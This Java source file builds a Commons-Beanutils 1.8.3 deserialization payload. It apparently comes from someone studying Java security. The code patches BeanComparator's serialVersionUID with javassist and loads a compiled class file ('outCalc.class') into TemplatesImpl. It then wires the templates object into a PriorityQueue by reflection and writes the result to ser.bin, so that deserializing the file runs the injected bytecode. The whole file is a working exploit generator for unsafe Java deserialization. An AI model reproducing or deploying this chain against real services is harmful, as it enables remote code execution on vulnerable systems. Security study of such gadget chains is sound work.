package CommonsBeanutils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB183 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
//        BeanComparator beanComparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);

        CtClass ctClass = ClassPool.getDefault().get(BeanComparator.class.getName());
        ctClass.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;",ctClass));  // 1.8.3的serialVersionUID不同
        //        ctClass.writeFile("E:\\Study\\java sec\\04\\src\\test");
        BeanComparator beanComparator = (BeanComparator) ctClass.toClass().newInstance();

        Class c = templates.getClass();
        Field name = c.getDeclaredField("_bytecodes");
        name.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\04\\target\\classes\\outCalc.class"));
        byte[][] codes = {code};
        name.set(templates,codes);

        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");

        Class z = BeanComparator.class;
        Field property = z.getDeclaredField("property");
        property.setAccessible(true);
        property.set(beanComparator,"outputProperties");
//        beanUtils.getProperty(templates,"outputProperties");
//        beanComparator.compare(templates,null);

        PriorityQueue priorityQueue = new PriorityQueue();
        Class cls = priorityQueue.getClass();
        Field comparator = cls.getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(priorityQueue,beanComparator);

        Field size = cls.getDeclaredField("size");
        size.setAccessible(true);
        size.set(priorityQueue,3);

        Field queue = cls.getDeclaredField("queue");
        queue.setAccessible(true);
        queue.set(priorityQueue,new Object[]{1,templates,3});

        serialize(priorityQueue);
//        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}
